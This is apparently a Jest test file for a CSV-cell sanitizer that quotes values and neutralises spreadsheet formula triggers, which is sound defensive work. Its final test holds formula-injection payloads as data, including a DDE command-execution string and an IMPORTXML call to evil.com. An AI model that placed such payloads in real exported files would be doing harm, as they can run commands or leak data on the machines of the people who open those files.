import { sanitizeCsvCell } from '../csvSanitization';

describe('sanitizeCsvCell', () => {
  it('should format standard text inside quotes', () => {
    expect(sanitizeCsvCell('John Scout')).toBe('"John Scout"');
  });

  it('should handle null and undefined', () => {
    expect(sanitizeCsvCell(null)).toBe('""');
    expect(sanitizeCsvCell(undefined)).toBe('""');
  });

  it('should handle numbers and booleans', () => {
    expect(sanitizeCsvCell(123)).toBe('"123"');
    expect(sanitizeCsvCell(true)).toBe('"true"');
  });

  it('should escape internal double quotes', () => {
    expect(sanitizeCsvCell('John "Eagle" Doe')).toBe('"John ""Eagle"" Doe"');
  });

  it('should prefix formula trigger characters with a single quote', () => {
    expect(sanitizeCsvCell('=SUM(1,2)')).toBe('"\'=SUM(1,2)"');
    expect(sanitizeCsvCell('+1-2')).toBe('"\'+1-2"');
    expect(sanitizeCsvCell('-cmd|\' /C calc\'!A1')).toBe('"\'-cmd|\' /C calc\'!A1"');
    expect(sanitizeCsvCell('@IMPORTXML("http://evil.com")')).toBe('"\'@IMPORTXML(""http://evil.com"")"');
  });
});
